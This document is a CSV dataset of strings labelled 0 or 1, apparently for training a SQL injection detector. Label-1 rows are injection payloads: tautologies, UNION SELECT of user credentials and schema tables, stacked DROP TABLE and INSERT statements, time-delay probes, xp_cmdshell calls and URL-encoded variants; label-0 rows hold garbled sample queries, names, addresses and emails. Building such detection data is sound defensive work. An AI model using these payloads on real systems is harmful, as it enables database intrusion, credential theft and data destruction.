Sentence,Label
SELECT yesterday ( s FROM plain RIGHT JOIN,0
SELECT * FROM most  WHERE or = talk,0
"testadmin"" OR ""1""=""1 AND 1=1613-- AND 1=1460",1
kostka5@institutoandaluzdelmar.an,0
SELECT * FROM glass  WHERE sat = blanket,0
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*917614",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#359982",1
keehn,0
0x27; DROP TABLE users-- OR 1=1750,1
"1"" UNION SELECT NULL----395/*--",1
"c/ juan de bustamante, 30, 10b",0
1'%20OR%201%20=%20157540971325,1
trenaman_bourbault@sms24h.ar,0
SELECT * FROM no WHERE heard NOT LIKE '[dog]%',0
' OR '2'='213973 AND 1=1--53 AND 1=1414,1
"user1' UNION SELECT NULL,table_name FROM information_schema.tables----648",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1248874",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631183829",1
'/**/OR/**/1=1-- OR 1=1876--/*828,1
' AND 2=CAST((SELECT @@version) AS int)--881--,1
wostrikoff@hojainformativas.gi,0
admin'%20OR%20'1'='1 AND 1=1987446,1
"test"") OR (""1""=""1#16",1
SELECT TOP 3 * FROM carefully,0
ibarrangelu,0
SELECT * FROM map  WHERE depth = leather,0
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1721",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/*884",1
admin0x27/*58782,1
user' OR '1'='1#315-- AND 1=1 OR 1=1868,1
00699529f,0
"user"" UNION SELECT NULL--/*",1
user') OR 1=1-- AND 1=188235030750590,1
SELECT COUNT ( comfortableID ) FROM tree,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--527",1
SELECT * FROM tired WHERE Price NOT BETWEEN 10 AND 20,0
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1",1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1993",1
SELECT sing ( s )  FROM deeply LEFT JOIN,0
""") OR (""1""=""1/* OR 1=1--326 AND 1=1250--",1
';%09EXEC%09xp_cmdshell('dir')----#423,1
daya basulto,0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*--",1
user' OR 1=1/*/* AND 1=1--118513,1
1' OR '1' = '1 AND 1=1 AND 1=1/*993960--,1
admin' OR 1=1/*#10488,1
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=1707730",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462/*317--,1
SELECT * FROM biggest,0
"test' UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1773",1
ADMIN'/*172620279 OR 1=1,1
0x27; DROP TABLE users--15#701 OR 1=1562,1
user' OR 1=1--/* OR 1=178807,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",0
"""%20or%201=1#667--42",1
') OR ('2'='2 OR 1=1290123,1
""" OR 1=1#----## AND 1=1274/*",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*/*554176",1
"SELECT * FROM parts WHERE storm BETWEEN ""part"" AND    ""tears""",0
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0
' OR '2'='213/*10375,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1740970",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1179",1
SELECT division ( s )  FROM satisfied UNION,0
"ADMIN""/*172871999649",1
99' OR 99 = 99 OR 1=1#872331793,1
"  SELECT   IF ( 500<1000, ""YES"", ""NO"" ) ;",0
')+OR+('1'='1-- AND 1=1,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##139",1
SELECT * FROM ruler WHERE shells  BETWEEN 10 AND 20,0
SELECT * FROM prove,0
"calle ducado de neopatria 63, 12-h",0
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1/*",1
'/**/OR/**/1=1-- OR 1=1/*857 AND 1=1,1
13082383y,0
induracin,0
feix ablitas,0
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380544,1
"   SELECT Employees.flies, COUNT ( Orders.replaceID )  AS collectFROM    ( OrdersINNER JOIN cowboy ON Orders.fuelID  =  Employees.flameID ) ",0
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75#",1
'/**/OR/**/'a'='a922980622971 OR 1=1,1
SELECT * FROM price WHERE stems BETWEEN '1996-07-01' AND '1996-07-31',0
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1 AND 1=1#,1
1' OR '1'='1' --/*612 AND 1=117,1
"""+OR+""1""=""1--549 OR 1=1997/* OR 1=1",1
banyeres del peneds,0
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1,1
abia de la obispala,0
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#804192730 AND 1=1,1
"virgen del valle, 40",0
SELECT AVG ( Price ) FROM home,0
SELECT * FROM earlier WHERE heart IN  ( SELECT equipment FROM are ) ,0
"   SELECT wave, reason+ ', ' + produce+ ' ' + class+ ', ' + or AS behavior  FROM dawn",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262335 )  ORDER BY meta_id ASC",0
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958945",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/*892,1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/* OR 1=1624,1
1' OR 'a'='a OR 1=1#38688/*/*,1
test' OR '1'='1 AND 1=1-- OR 1=1,1
cancela,0
SELECT TOP 3 * FROM program,0
FROM  ( SELECT DISTINCT mile FROM introduced ) ,0
%2527%2520OR%25201%253D1%2523/*,1
20654328y,0
SELECT * FROM report WHERE machinery = 'entirely'  AND  ( average = 'spend' OR bar = 'tight' ) ,0
"ADMIN""/*172247/*--",1
"1"" OR ""1""=""1"" --#57 OR 1=1418",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1-- OR 1=1##",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517732206",1
""" OR ""2""=""213973 AND 1=1--53 AND 1=1",1
SELECT * FROM hour,0
admin' UNION SELECT NULL-- AND 1=1#36 OR 1=1#,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----#760,1
"test' UNION SELECT username,password FROM users--/*836#758",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1 AND 1=1 OR 1=1 AND 1=1 AND 1=1",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1677 OR 1=1",1
"""%20or%201=1# AND 1=1 OR 1=1396",1
"test' UNION SELECT 1,2,3--/*",1
SELECT * FROM without WHERE car = 'especially'  OR tears = 'southern',0
atrazar,0
"calle mariano garcia, s/n",0
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878699",1
"useradmin"" OR 1=1--#572/*-- OR 1=1212",1
1'%09OR%09'1'%09=%09'1998/* OR 1=1628,1
"1"" OR ""a""=""a AND 1=1334",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48--139,1
"""/**/OR/**/1=1-- OR 1=1/*8578907077",1
DELETE FROM tight,0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302909890",1
SELECT TOP 3 * FROM knife,0
"  UPDATE fair SET those =  'wore', City =  'ship' WHERE weak =  possibly",0
bechara,0
SELECT above ( s FROM beauty RIGHT JOIN,0
1'%20OR%20'1'%20=%20'1918903,1
99' OR 99 = 99 OR 1=1#872331--417,1
""" UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1",1
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause,0
"""; UPDATE users SET password=""hacked""--816",1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393 AND 1=1",1
aDMin'/*778914,1
""" OR ""1""=""1#474#30#",1
"alcalde baeza medina, s/n,",0
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*680 OR 1=1",1
SELECT COUNT ( aid ) FROM fallen,0
"1' UNION SELECT 1,2,3-- AND 1=1 AND 1=115",1
"INSERT INTO standard  ( pond, real, tune )  VALUES  ( 'choice', 'sudden', 'tax' )  ",0
' or 2=2----456,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*273",1
1'%09OR%09'1'%09=%09'1998318,1
""" OR ""a""=""a AND 1=123",1
"  SELECT coffee,report,worried FROM combine LEFT JOIN Orders ON motion.armyID =  instance.driven ORDER BY last.composition",0
"""/**/or/**/1=1/*135 OR 1=1634",1
1' OR '1'='1' --/*#9,1
"   SELECT Employees.create, COUNT ( Orders.homeID )  AS captainFROM    ( OrdersINNER JOIN tool ON Orders.simplestID  =  Employees.dailyID ) ",0
"test' UNION SELECT NULL,NULL--/*--#",1
" SELECT column_name ( s )  FROM musical,seeing",0
"'%20UNION%20SELECT%20NULL,NULL,NULL----#/*",1
"test"") OR 1=1--/* OR 1=1/*",1
guango,0
' OR '1'='1' --/* AND 1=1793# OR 1=1421388,1
'+OR+1=1#/*16051,1
""" UNION SELECT NULL--/*622/* AND 1=1",1
"test' UNION SELECT NULL,NULL--/* AND 1=1--27",1
user' OR '1'='1#315-- AND 1=1 OR 1=1185,1
')+OR+('1'='1 AND 1=1875 AND 1=1,1
"test' UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1845",1
' OR '2'='2 AND 1=1 AND 1=1--173------,1
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=194",1
micr6pil8,0
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY,0
"1'; INSERT INTO users VALUES('hacked','pass')--739##375610",1
"admin"" OR ""1""=""1"" /* AND 1=1452900#",1
' OR '2'='2277 AND 1=1,1
' OR '2'='213973 AND 1=1--53-- AND 1=1,1
useradmin' OR 1=1------767,1
8185950000000000,0
"""/**/OR/**/""a""=""a827280195",1
testadmin' OR '1'='1#624 OR 1=1/*486,1
"INSERT INTO slowly  ( sight, tree, feature )  VALUES  ( 'farmer', 'means', 'but' )  ",0
1230,0
1' OR '1'='1' --/* OR 1=1,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/*--",1
"1"" OR ""a""=""a AND 1=1--376517 AND 1=1--",1
suplementero,0
'%20or%201=1##,1
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ,0
1' UNION SELECT NULL----395583350,1
"ADMIN""/*1721501",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1361,1
"""/**/OR/**/1=1-- OR 1=1/*857890 AND 1=1",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1 OR 1=1",1
nona,0
SELECT AVG ( imagine ) FROM directly,0
') OR ('1'='1/*-- OR 1=1251#,1
2' AND SLEEP(5)---- OR 1=1,1
"ADMIN""/*172247/*309312",1
') OR ('1'='1/* OR 1=1--/*610,1
') OR ('1'='1/* OR 1=1--/* AND 1=111#,1
10970,0
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--",1
test' OR 1=1#/*#889--998,1
SELECT expect ( s )  FROM say LEFT JOIN,0
"user"") OR (""1""=""1--167387#--",1
"  SELECT Orders.relationshiprID, Employees.press, Employees.natural FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planningID ORDER BY Orders.dogID",0
"""+OR+""1""=""1--77592450",1
'+OR+1=1----837,1
';/**/DROP/**/TABLE/**/users--/*,1
user' UNION SELECT NULL-- AND 1=1/*,1
9629,0
admin'/**/OR/**/1=1--/* OR 1=1,1
1'/**/AND/**/pg_sleep(5)--676,1
2'--452222,1
SELECT * FROM can WHERE NOT brief = 'desk'  AND NOT method = 'its',0
""" OR ""2""=""213 AND 1=1/*26727 AND 1=1216",1
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ) ,0
1' OR '1'='1 OR 1=1257--570,1
'/**/OR/**/'1'='1'/**/-- OR 1=1575518/*,1
SELECT * FROM claws WHERE room  BETWEEN 10 AND 20,0
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/* OR 1=1",1
SELECT * FROM feed WHERE    NOT country = 'herself',0
"'/**/UNION/**/SELECT/**/NULL,NULL,NULL--291",1
log9era,0
"   SELECT Employees.fun, COUNT ( Orders.ruleID )  AS anyoneFROM    ( OrdersINNER JOIN pot ON Orders.coolID  =  Employees.beautyID ) ",0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311#/*",1
feutlins,0
admin' OR 1=1/*##487830,1
') OR 1=1-- AND 1=1,1
SELECT greatest ( s )  FROM felt SELECT written FROM acres,0
admin' UNION ALL SELECT NULL--24127 AND 1=1,1
"   SELECT zebra, market, adventure FROM court WHERE different  IS NULL",0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##504/*",1
%27%20OR%201%3D1%2F%2A735486,1
test' OR '1'='1' /*#/*654199,1
admin' OR '1'='195862--,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600560",1
llobet garrido,0
1'%20OR%201%20=%201575409713--747,1
""" OR ""2""=""213 AND 1=1/*26727 AND 1=141",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1345",1
SELECT TOP 50 PERCENT * FROM fallen,0
test' UNION SELECT NULL----#779625253,1
1%27%20OR%201%20%3D%201 AND 1=1,1
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0
10x27 AND pg_sleep(5)--#/*,1
1' OR 'a'='a544#--,1
11' OR 1 = 1/*--,1
"admin"" UNION SELECT NULL,NULL,NULL--/*435",1
ferne,0
76150645z,0
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1197",1
1'%20AND%20pg_sleep(5)--533553937,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1798,1
68689912k,0
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429#,1
SELECT secret ( s FROM must RIGHT JOIN,0
"test"" OR 1=1##933102/*753 AND 1=1",1
"c/ bascuana 52, 5-e",0
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0
admin0x27/* OR 1=1 AND 1=1825,1
' or 2=2/*# OR 1=1689,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739 AND 1=1567 AND 1=1",1
user' UNION SELECT NULL----#,1
admin1' OR '1' = '1--/*603 AND 1=1787,1
"   SELECT COUNT ( roll ) , field FROM die BY are",0
SELECT * FROM identity WHERE burn BETWEEN '1996-07-01' AND '1996-07-31',0
"""+UNION+SELECT+NULL--608690610",1
33s4h9929r,0
' OR '1'='1#1 AND 1=1833,1
admin1' OR '1' = '1--/*603#937149995915/*,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")---- AND 1=1",1
"' UNION SELECT NULL,NULL,NULL--241156",1
"admin""/*451446794",1
admin' OR '1'='1 AND 1=199868,1
' or 2=2/* AND 1=1/*#,1
" SELECT * FROM discovery ORDER BY hollow, guess",0
"user' UNION SELECT username,password FROM users------245#583",1
"admin' UNION SELECT 1,2,3---- OR 1=1244",1
admin' OR 1=1#177633 OR 1=1,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631183641",1
admin0x27/*58763508/*,1
admin1' OR '1' = '1--279# AND 1=1787,1
'/**/or/**/1=1/*135540 OR 1=1358,1
"' UNION SELECT 1,2,3--",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117453,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1892,1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1#,1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) ,0
7ngr5ta3ente,0
parra,0
SELECT TOP 3 * FROM split,0
reig jallo,0
" SELECT column_name ( s )  FROM old,triangle",0
user' OR '1'='1--/*,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=150991--",1
rei1@rtce.au,0
c/ galvan 98 10?a,0
""") OR (""1""=""1/*--",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1#--",1
"user' UNION SELECT username,password FROM users------245#347",1
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink',0
SELECT tears FROM gain,0
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/*829,1
"1"" OR ""1"" = ""1-- OR 1=1#334184",1
1'%20AND%20pg_sleep(5)--533872322,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923/*",1
"admin' UNION SELECT NULL,NULL,NULL------",1
cuarentona,0
SELECT * FROM review WHERE known BETWEEN '1996-07-01' AND '1996-07-31',0
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--/*",1
edelmar,0
"  SELECT * FROM happily WHERE length IN  ( 'pig', 'call', 'ten' )  ",0
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*771",1
'%20or%201=1# AND 1=1535,1
"' union select null,null,null--##37",1
"""%20or%201=1/*/*",1
"sin sol 15,",0
SELECT * FROM vast ORDER BY forest DESC,0
"testadmin"" OR ""1""=""1 AND 1=1613186#218616306227",1
kangning,0
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*175,1
""" OR ""1""=""1#358 OR 1=1",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1159727",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718",1
"admin"" UNION ALL SELECT NULL--2412747416142727",1
73361115q,0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk,0
SELECT * FROM also FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM powder,0
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1631,1
""" UNION SELECT NULL,NULL,NULL--/* AND 1=1",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##945",1
jarad,0
knippenberg@soyriojano.cf,0
37795,0
"admin"" UNION SELECT NULL,NULL,NULL--/*410/*",1
1' OR 1=1#--402,1
1' UNION ALL SELECT NULL-- AND 1=1 OR 1=1,1
entendimiento,0
1%27--454 AND 1=1,1
"  SELECT mentalID AS ID, broad AS sight FROM shelf",0
09069193v,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1104",1
SELECT * FROM chain  WHERE alive NOT LIKE '[recent]%',0
' OR '2'='213/*10#,1
""" OR 1=1#--/*#",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631183859",1
SELECT stay ( s ) FROM product INNER JOIN,0
SELECT DISTINCT force FROM lonely,0
"user"") OR (""1""=""1 OR 1=1--",1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1,1
"  SELECT occur,clothes FROM oil WHERE remain = 'quarter' UNION SELECT plane, zipper FROM zoo",0
"1"" UNION SELECT NULL----159334804",1
SELECT * FROM soldier ORDER BY catch DESC,0
"' AND extractvalue(99,concat(0x7e,version()))-- OR 1=1",1
admin' UNION ALL SELECT NULL--24127# AND 1=1 OR 1=1,1
'%20OR%20'1'='1'%20/*915433,1
2' AND SLEEP(5)-- AND 1=1,1
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0
"admin"" OR ""1""=""1 AND 1=1998-- AND 1=1653",1
lieneman,0
1' OR 'a'='a544/*606390,1
SELECT lost FROM refused UNION SELECT sad FROM mill ORDER BY careful,0
"1' UNION SELECT NULL,NULL----469",1
23266,0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*316680",1
test' OR 1=1#/*#875833,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1---- AND 1=1385",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11514 )  ORDER BY meta_id ASC",0
"1"" UNION SELECT NULL,NULL------611#",1
'/**/or/**/1=1/* AND 1=1 AND 1=1 OR 1=1 OR 1=1,1
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel,0
"test"") OR (""1""=""1----",1
48263928s,0
gering,0
';%20EXEC%20xp_cmdshell('dir')--#/*490,1
ADMIN'/*172620849196 AND 1=1,1
%27%20or%201%3D1%23826 OR 1=1--,1
"test' UNION SELECT 1,2,3----556",1
'+OR+1=1----966515,1
SELECT TOP 50 PERCENT * FROM aside,0
"""/**/OR/**/1=1-- OR 1=1876/*",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=134",1
DELETE FROM ring,0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81237",1
benajas rodrguez,0
admin' UNION ALL SELECT NULL--24/* OR 1=1/*,1
""" OR ""1""=""1 AND 1=1224",1
SELECT * FROM struck WHERE at = 'dance',0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*",1
' or 2=2----828,1
"' UNION SELECT NULL,NULL,NULL--241 AND 1=1",1
SELECT * FROM lamp WHERE contrast BETWEEN camp09/01/1996blue AND per15/31/1996paragraph,0
"testadmin"" OR ""1""=""1 AND 1=1613186#218616 AND 1=1",1
"test"" UNION SELECT 1,2,3-- OR 1=1986",1
schnirer,0
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*945",1
')+OR+('1'='1 AND 1=1--,1
"zoma, la",0
"""%20or%201=1#428/* OR 1=1 AND 1=1922",1
' or 2=2--#46828 OR 1=1211,1
"admin' UNION SELECT NULL,NULL,NULL--/*#444951#",1
"ADMIN""/*172247/*799 OR 1=1",1
%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--431,1
SELECT * FROM rope WHERE characteristic NOT LIKE 'indeed%',0
' OR '2'='213/*10352,1
1' OR 'a'='a544#-- OR 1=1472409,1
SELECT MIN ( choice )  AS play FROM extra,0
""";%20EXEC%20xp_cmdshell(""dir"")--591 AND 1=1108/* OR 1=1742/*",1
" SELECT * FROM effort ORDER BY information, somehow",0
SELECT * FROM final WHERE bicycle = 'brief',0
SELECT AVG ( Price ) FROM method,0
SELECT * FROM people WHERE desk LIKE '%laid%',0
"""%20or%201=1/*835 OR 1=1239",1
'%20or%201=1/*83525738383159687,1
13061311w,0
'+OR+'1'='1--/*/*,1
SELECT * FROM jump WHERE garden BETWEEN third09/01/1996boat AND east15/31/1996plan,0
SELECT COUNT ( especially )  FROM nodded,0
'/**/OR/**/1=1-- OR 1=1 AND 1=1752,1
useradmin' OR 1=1--#/*606171--,1
charpini_daillie@inmobiliariahangar.ly,0
admin' OR '1'='1' /*/*497676,1
SELECT * FROM corner WHERE dot BETWEEN '1996-07-01' AND '1996-07-31',0
harshad,0
'%20or%201=1# AND 1=1/*7333,1
SELECT AVG ( everywhere ) FROM acres SELECT SUM ( mistake ) ,0
""" OR 1=1#-- OR 1=1329",1
81383348x,0
"useradmin"" OR ""1""=""1-- OR 1=1125737948362",1
test' OR '1'='1 AND 1=1--#134,1
camisoln,0
test' OR '1'='1' /*#632136,1
') OR ('1'='1/* OR 1=1293591744,1
SELECT * FROM higher FETCH FIRST 50 PERCENT ROWS ONLY,0
huertas acosa,0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1276",1
%27%20OR%20%27a%27%3D%27a/*--#40667,1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#597",1
"1"" UNION SELECT NULL----395/* AND 1=1228931/*",1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--213,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=1#",1
"petxina, 77, 2b",0
"'%20UNION%20SELECT%20NULL,NULL,NULL--51113872970",1
1' OR '1'='1/*,1
"testadmin"" OR ""1""=""1 AND 1=1613-- AND 1=1",1
1'%20OR%201%20=%20123,1
'%20or%201=1/*835257383135 OR 1=1,1
"admin' UNION SELECT NULL,NULL--/*/* OR 1=1",1
0x27) OR 1=1--# AND 1=1 OR 1=1259,1
test' UNION SELECT NULL----#261 AND 1=1,1
' OR '2'='2/*785/*,1
47343175k,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1869348",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1761",1
"1"" OR ""a""=""a AND 1=1--376517811",1
%27%20or%201%3D1%2382345,1
adminadmin' OR '1'='1/*-- OR 1=1,1
"""%20AND%20extractvalue(1,concat(0x7e,version()))------",1
') OR ('2'='2 OR 1=1285,1
3u23pe,0
"  SELECT * FROM setting WHERE struck IN  ( 'drink', 'giving', 'temperature' )  ",0
""") OR (""1""=""1/* OR 1=1293408209",1
"   SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL",0
user') OR ('1'='1--292,1
SELECT * FROM dog 3 SELECT * FROM gave,0
user' OR '1'='1#-- OR 1=1--,1
roxette,0
"user"" UNION SELECT NULL,NULL--/* OR 1=1 OR 1=1826",1
' UNION SELECT NULL--/*622/*42723 AND 1=1,1
"1' UNION SELECT username,password FROM users--/* AND 1=1",1
' OR 1=1#-- OR 1=1#810#,1
"useradmin"" OR 1=1--#572 OR 1=1294",1
kangelis,0
SELECT COUNT ( DISTINCT matter )  FROM several,0
"ADMIN""/*172871497",1
admin' OR 1=1/*## OR 1=1349697411,1
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",0
"' union select null,null,null--# AND 1=1--535 OR 1=1",1
""" OR ""1""=""1 AND 1=1104709",1
DELETE FROM express WHERE adult = 'spin',0
SELECT COUNT ( tinID ) FROM satisfied,0
" SELECT column_name ( s )  FROM circus,western",0
'%20or%201=1/*835257383491,1
' OR 1=1#-- OR 1=1964 OR 1=1,1
SELECT * FROM smooth WHERE choose BETWEEN 'news' AND 'drop',0
SELECT AVG ( composition ) FROM join SELECT SUM ( will ) ,0
""")+OR+(""1""=""1-- AND 1=1891",1
tharsis s/n 11?c,0
"1"" UNION SELECT NULL,NULL------611--306493# OR 1=1#",1
"1""+OR+1+=+1/*----",1
"user' UNION SELECT NULL,NULL,NULL--805 OR 1=1 AND 1=1876",1
' UNION SELECT NULL--/* AND 1=1,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_6102e466912f5' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
admin' OR 1=1-- OR 1=1 OR 1=1,1
SELECT * FROM chance WHERE similar = 'pile',0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708230",1
51993302p,0
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1--285",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--442",1
7636020000000000,0
alfama,0
SELECT pale ( s )  FROM paper,0
0x27; UPDATE users SET password=0x27hacked0x27--447/*,1
1admin' OR 1=1--#951359563,1
""") OR (""1""=""1/* OR 1=1--/*885 OR 1=1",1
1' OR 'a'='a OR 1=1964,1
nalec,0
s-ierro,0
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958660",1
